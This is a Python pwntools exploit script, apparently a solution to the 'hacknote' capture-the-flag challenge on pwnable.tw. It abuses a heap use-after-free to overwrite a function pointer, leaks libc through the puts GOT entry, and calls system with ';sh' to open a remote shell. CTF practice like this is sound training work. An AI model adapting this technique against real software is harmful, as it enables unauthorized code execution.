from pwn import *

#r = process('./hacknote', env={"LD_PRELOAD":"/lib/i386-linux-gnu/libc.so.6"})
r = remote('chall.pwnable.tw', 10102)

def new(sz, data):
    r.sendlineafter('Your choice :', '1')
    r.sendlineafter('Note size :', str(sz))
    r.sendafter('Content :', data)
def delete(idx):
    r.sendlineafter('Your choice :', '2')
    r.sendlineafter('Index :', str(idx))
def printt(idx):
    r.sendlineafter('Your choice :', '3')
    r.sendlineafter('Index :', str(idx))
    return r.recvline()[:-1]


raw_input("@")
new(32, 'aaaa')
new(32, 'bbbb')
delete(0)
delete(1)
print_addr = 0x804862b
puts_got = 0x804a024

new(8, flat(print_addr)+flat(puts_got))
raw_input("@")
libc_puts = printt(0)
libc_puts = u32(libc_puts[:4].ljust(4, '\x00'))
libc_base = libc_puts - 0x5f140 #0x5fca0
libc_sys = libc_base + 0x3a940 #0x3ada0

#libc_base = libc_puts - 0x5fca0
#libc_sys = libc_base + 0x3ada0

print hex(libc_puts)
print hex(libc_base)

delete(2)
new(8, flat(libc_sys)+ flat(0x0068733b))
raw_input("@")
r.sendlineafter('Your choice :', '3')
r.sendlineafter('Index :', '0')

r.interactive()
